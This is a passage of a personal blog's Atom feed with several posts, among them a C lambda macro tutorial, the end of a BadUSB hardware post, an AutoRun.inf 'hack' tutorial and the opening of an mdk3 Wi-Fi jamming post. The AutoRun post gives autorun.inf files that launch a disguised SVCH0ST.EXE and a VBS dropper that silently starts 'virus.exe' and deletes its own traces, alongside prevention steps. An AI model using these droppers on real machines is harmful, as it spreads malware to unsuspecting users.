+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A11&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;SS&lt;/td&gt;
+      &lt;td&gt;12  SS&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt;A12&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;RST&lt;/td&gt;
+      &lt;td&gt;RST&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;VIN&lt;/td&gt;
+      &lt;td&gt;VIN(6-16v)&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;GND&lt;/td&gt;
+      &lt;td&gt;0v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;VCC&lt;/td&gt;
+      &lt;td&gt;VCC&lt;/td&gt;
+      &lt;td&gt;5v&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;pwm&quot;&gt;PWM&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://digistump.com/wiki/digispark/tutorials/propwm&quot; target=&quot;_blank&quot;&gt;https://digistump.com/wiki/digispark/tutorials/propwm&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;legal-notice&quot;&gt;LEGAL NOTICE&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;THESE SOFTWARES AND SCRIPTS ARE PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY WE DO NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THESE SOFTWARES AND SCRIPTS YOU AGREE WITH THESE TERMS.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Pentest" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/badusb/cover.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/badusb/cover.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Want to use Lambda Functions in C? Lambda for C</title><link href="https://theodorecooper.github.io/c/c++/c%20tutorials/2022-clambda/" rel="alternate" type="text/html" title="Want to use Lambda Functions in C? Lambda for C" /><published>2022-04-30T00:00:00-04:00</published><updated>2022-04-30T07:53:08-04:00</updated><id>https://theodorecooper.github.io/c/c++/c%20tutorials/clambda</id><content type="html" xml:base="https://theodorecooper.github.io/c/c++/c%20tutorials/2022-clambda/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;Some programming languages featrue &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lamda Functions&lt;/code&gt;, that means you can call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;small anonymous functions&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;“Lambda” function comes from mathematics, where it is called &lt;em&gt;lambda calculus&lt;/em&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;A lambda function can take any number of arguments, but can only have
+one expression. Why Use Lambda Functions? The power of lambda is better
+shown when you use them as an anonymous function inside another
+function.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;For example, in Python, Lambda Functions is supported.&lt;/p&gt;
+
+&lt;p&gt;A simple function expressed with a standard Python function definition using the keyword &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;def&lt;/code&gt; as follows:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In contrast, we can use Lambda:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Keyword: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Bound variable: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Body: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x+1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Modern C++ also has lambda expressions:&lt;/p&gt;
+
+&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capture&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clause&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;  
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;   
+   &lt;span class=&quot;n&quot;&gt;definition&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;method&lt;/span&gt;   
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;lambda--c&quot;&gt;Lambda &amp;amp; C&lt;/h2&gt;
+
+&lt;p&gt;In C, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lambda&lt;/code&gt; is not naturely supported, so you have to define a function by name and pass a pointer. However, it’s not a big problem — if you use &lt;strong&gt;gcc&lt;/strong&gt;, there are some nonstandard features you can use to get what you want out of the lambda functions.&lt;/p&gt;
+
+&lt;p&gt;So let’s see how it works.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define lambda(lambda$_ret, lambda$_args, lambda$_body)\
+({\
+lambda$_ret lambda$__anon$ lambda$_args\
+lambda$_body\
+&amp;amp;lambda$__anon$;\
+})
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This takes advantage of the gcc and the fact that gcc will let you use dollar signs in identifiers. You meed to pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--std=gnu99&lt;/code&gt; on the gcc command line to make this work properly, for example:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; lambda &lt;span class=&quot;nt&quot;&gt;--std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;gnu99 lambda.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Here’s a full example:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;#define lambda(lambda$_ret, lambda$_args, lambda$_body)\
+  ({\
+    lambda$_ret lambda$__anon$ lambda$_args\
+      lambda$_body\
+    &amp;amp;lambda$__anon$;\
+  })
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Sum = %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Result:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;In fact, you really don’t have to have lambda with C. they are not very portable. If lambda was a useful feature K&amp;amp;R would have included it. Just for fun.&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="C/C++" /><category term="C Tutorials" /><category term="C/C++" /><category term="C Tutorials" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/clambda/lambda.jpeg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/clambda/lambda.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Advanced way to hack with AutoRun.inf | Virus carried by USB sticks</title><link href="https://theodorecooper.github.io/pentest/2022-autorun/" rel="alternate" type="text/html" title="Advanced way to hack with AutoRun.inf | Virus carried by USB sticks" /><published>2022-03-20T00:00:00-04:00</published><updated>2022-03-26T06:33:33-04:00</updated><id>https://theodorecooper.github.io/pentest/autorun</id><content type="html" xml:base="https://theodorecooper.github.io/pentest/2022-autorun/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;You may be wondering what exactly is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt; is a text file that can be used by the &lt;em&gt;AutoRun&lt;/em&gt; and &lt;em&gt;AutoPlay&lt;/em&gt; components of Microsoft Windows operating systems. It contains the code that will be execute automatically. It is often existed in the root directory of USB sticks and DVD.&lt;/p&gt;
+
+&lt;h3 id=&quot;summary&quot;&gt;Summary&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
+      &lt;th&gt;&lt;strong&gt;Autorun.inf&lt;/strong&gt;&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Type&lt;/td&gt;
+      &lt;td&gt;&lt;em&gt;Virus/Worm&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Danger Level&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;High&lt;/strong&gt; (Will lock you out of your drives and potentially steal private information)&lt;br /&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Symptoms&lt;/td&gt;
+      &lt;td&gt;When you try to access one of your drives you will be blocked by a looped Autorun menu.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: center&quot;&gt;Distribution Method&lt;/td&gt;
+      &lt;td&gt;Can install itself online from one infected drive onto another, can also be contracted from installing an infected executable file obtained from malicious email or other download.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;write-a-autoruninf&quot;&gt;Write a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;Insert a USB stick. As I mentioned before, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;autorun.inf&lt;/code&gt; should be placed in the root directory of the volume, so we create in the root directory and open the file with any text editor.&lt;/p&gt;
+
+&lt;p&gt;The Autorun.inf file can also contain optional information including:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The name of a file that contains an icon that will represent your
+application’s CD-ROM drive. This icon will be displayed by Windows
+Explorer in place of the standard drive icon.&lt;/li&gt;
+  &lt;li&gt;Additional commands for the shortcut menu that is displayed when the
+user right-clicks the CD-ROM icon. You can also specify the default
+command that is run when the user double-clicks the icon.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The &lt;strong&gt;[autorun]&lt;/strong&gt; section contains the default AutoRun commands. All Autorun.inf files must have an &lt;strong&gt;[autorun]&lt;/strong&gt; section.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Command&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;defaulticon&lt;/td&gt;
+      &lt;td&gt;Specifies the default icon for the application.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;icon&lt;/td&gt;
+      &lt;td&gt;Specifies the path and file name of an application-specific icon for the CD-ROM drive.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;open&lt;/td&gt;
+      &lt;td&gt;Specifies the path and file name of the startup application.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;useautorun&lt;/td&gt;
+      &lt;td&gt;Specifies that Autoplay V2 features should be used if supported.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;shell&lt;/td&gt;
+      &lt;td&gt;Defines the default command in the CD-ROM’s shortcut menu.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;shell_verb&lt;/td&gt;
+      &lt;td&gt;Adds commands to the CD-ROM’s shortcut menu.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Here are two common examples:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[autorun]
+open=.\RECYCLER\RECYCLER\autorun.exe
+
+shell\1=Open
+shell\1\Command=.\RECYCLER\RECYCLER\autorun.exe
+shell\2\=Browser
+shell\2\Command=.\RECYCLER\RECYCLER\autorun.exe
+
+shellexecute=.\RECYCLER\RECYCLER\autorun.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It will execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RECYCLER\RECYCLER\autorun.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[autorun]
+open=SVCH0ST.EXE
+shell\open=Open(&amp;amp;O)
+shell\open\Command=SVCH0ST.EXE
+shell\open\Default=1
+shell\explore=Explorer(&amp;amp;X)
+shell\explore\Command=SVCH0ST.EXE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It will execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SVCH0ST.EXE&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;create-an-advanced-autoruninf&quot;&gt;Create an advanced &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;&lt;/h2&gt;
+
+&lt;p&gt;First, we create a &lt;em&gt;Self-exacting File&lt;/em&gt;(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run.exe&lt;/code&gt;), it should contained the virus(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virus.exe&lt;/code&gt;) and a VBS script(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AutoRun.vbs&lt;/code&gt;):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-vbs&quot;&gt;set sh = wscript.createobject(&quot;wscript.shell&quot;)
+sh.run &quot;cmd /c start virus.exe&quot;,0
+sh.run &quot;cmd /c del Autorun.inf&quot;,0
+sh.run &quot;cmd /c start c:\&quot;,0
+sh.run &quot;cmd /c del AutoRun.vbs&quot;,0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Then, upload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run.exe&lt;/code&gt; and Autorun.inf to the target(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt;).&lt;/p&gt;
+
+&lt;h2 id=&quot;how-to-prevent-autoruninf-virus&quot;&gt;How to prevent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt; virus&lt;/h2&gt;
+
+&lt;p&gt;There are three method to prevent &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt; virus:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Turn off AutoRun service.&lt;/li&gt;
+  &lt;li&gt;Delete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Disable the generation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;turn-off-autorun-service&quot;&gt;Turn off AutoRun service&lt;/h3&gt;
+
+&lt;p&gt;Open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;regedit.exe&lt;/code&gt;, locate to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Exploer]&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NoDriveTypeAutoRun&lt;/code&gt; decides whether AutoRun is on.&lt;/p&gt;
+
+&lt;p&gt;The following table gives the bits and bitmask constants, that can be set in the first byte of NoDriveTypeAutoRun to disable.&lt;/p&gt;
+
+&lt;p&gt;AutoRun for a particular drive type. You must restart Windows Explorer before the changes take effect.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Bit Number&lt;/th&gt;
+      &lt;th&gt;Bitmask Constant&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x04&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_REMOVEABLE&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Disk can be removed from drive (such as a floppy disk).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x08&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_FIXED&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Disk cannot be removed from drive (a hard disk).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x10&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_REMOTE&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;Network drive.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x20&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_CDROM&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;CD-ROM drive.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;0x40&lt;/td&gt;
+      &lt;td&gt;&lt;strong&gt;DRIVE_RAMDISK&lt;/strong&gt;&lt;/td&gt;
+      &lt;td&gt;RAM disk.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;delete-autoruninf&quot;&gt;Delete &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;Open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmd.exe&lt;/code&gt;, run following commands:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;attrib Autorun.inf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;
+
+del Autorun.inf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;disable-the-generation-of-autoruninf&quot;&gt;Disable the generation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;&lt;/h3&gt;
+
+&lt;p&gt;It’s easy to disable the generation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt;, just create an empty &lt;strong&gt;folder&lt;/strong&gt; named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Autorun.inf&lt;/code&gt; in the root directory.&lt;/p&gt;</content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Pentest" /><category term="Pentest" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/autorun/virus-autorun-cover.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/autorun/virus-autorun-cover.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">All the best for 2022!</title><link href="https://theodorecooper.github.io/other/2022-n22/" rel="alternate" type="text/html" title="All the best for 2022!" /><published>2022-01-01T00:00:00-05:00</published><updated>2022-01-01T04:07:57-05:00</updated><id>https://theodorecooper.github.io/other/n22</id><content type="html" xml:base="https://theodorecooper.github.io/other/2022-n22/"></content><author><name>Theodore Cooper</name><email>ccooperr2005@gmail.com</email></author><category term="Other" /><category term="Other" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://theodorecooper.github.io/assets/img/blog/n22/happy-new-year-2022.jpg" /><media:content medium="image" url="https://theodorecooper.github.io/assets/img/blog/n22/happy-new-year-2022.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)</title><link href="https://theodorecooper.github.io/linux/pentest/2021-mdk3/" rel="alternate" type="text/html" title="Perform jamming of Wi-Fi networks &amp;amp; Create fake APs with mdk3(DoS attack &amp;amp; Beacon Flooding)" /><published>2021-11-20T00:00:00-05:00</published><updated>2021-11-20T08:31:35-05:00</updated><id>https://theodorecooper.github.io/linux/pentest/mdk3</id><content type="html" xml:base="https://theodorecooper.github.io/linux/pentest/2021-mdk3/">&lt;hr /&gt;
+
+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;&lt;em&gt;mdk3&lt;/em&gt; is used for &lt;strong&gt;stress testing 802.11 networks(wifi)&lt;/strong&gt;. It consists of various methods by which we can perform tests. Some of  major method sare beacon flooding, deauthentication, WPA- dos etc…&lt;/p&gt;
+
+&lt;h2 id=&quot;mdk3-description&quot;&gt;mdk3 Description&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;MDK3 is a tool that “injects” data into wireless networks. “Injection” is the possibility to send self-made data through the air without being connected or associated to any network or station. MDK3 is used to send valid and invalid packets, which belong to the wireless management and not to regular data connections.&lt;/p&gt;
+
+&lt;p&gt;Homepage: https://github.com/charlesxsh/mdk3-master
+Author: ASPj of k2wrlz
+License: GPLv2&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;purpose&quot;&gt;Purpose&lt;/h2&gt;
+&lt;ol&gt;
